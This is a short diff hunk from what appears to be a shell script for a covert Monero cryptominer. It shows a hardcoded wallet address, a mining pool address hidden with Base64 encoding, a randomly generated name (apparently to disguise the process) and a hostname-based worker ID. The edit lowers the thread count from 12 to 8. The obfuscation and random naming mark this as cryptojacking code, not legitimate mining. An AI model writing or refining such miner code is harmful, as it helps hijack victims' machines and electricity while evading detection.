@@ -4,7 +4,7 @@
 WALLET="89PKYocdkhoeSCsn93wAVY7yqCAsSpgZkFriDyhFoW4DMZtzKRbeTZT4cgfedxvju98rXe6mT62eEZigpvV9VtAm5uSkZkQ"
 # Obfuscated pool (Base64 of pool.supportxmr.com:443)
 POOL=$(echo 'cG9vbC5zdXBwb3J0eG1yLmNvbTo0NDM=' | base64 -d)
-THREADS=12
+THREADS=8
 RAND_NAME=$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)
 WORKER_ID="worker-$(hostname | tr -dc a-z0-9)"
 
